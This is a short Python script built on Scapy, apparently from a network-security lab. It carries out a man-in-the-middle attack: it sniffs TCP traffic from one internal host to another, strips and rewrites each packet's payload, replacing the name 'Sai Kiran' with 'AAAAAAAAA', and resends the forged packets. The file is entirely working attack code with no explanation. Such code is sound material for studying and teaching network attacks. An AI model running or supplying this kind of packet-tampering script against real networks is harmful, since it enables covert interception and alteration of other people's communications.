#!/usr/bin/env python3
from scapy.all import *
from time import *

IP_A = "10.9.0.5"
IP_B = "192.168.60.5"
MAC_A = "02:42:0a:09:00:05"



print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            print("*** %s, length: %d" % (data, len(data)))
            
            newdata = data.replace(b'Sai Kiran', b'AAAAAAAAA')
            
            send(newpkt/newdata)
        else:
            send(newpkt)
    


f1 = 'tcp and ether src {A} and ip dst {B}'.format(A=MAC_A, B=IP_B)

pkt = sniff(iface='eth0', filter=f1, prn=spoof_pkt)
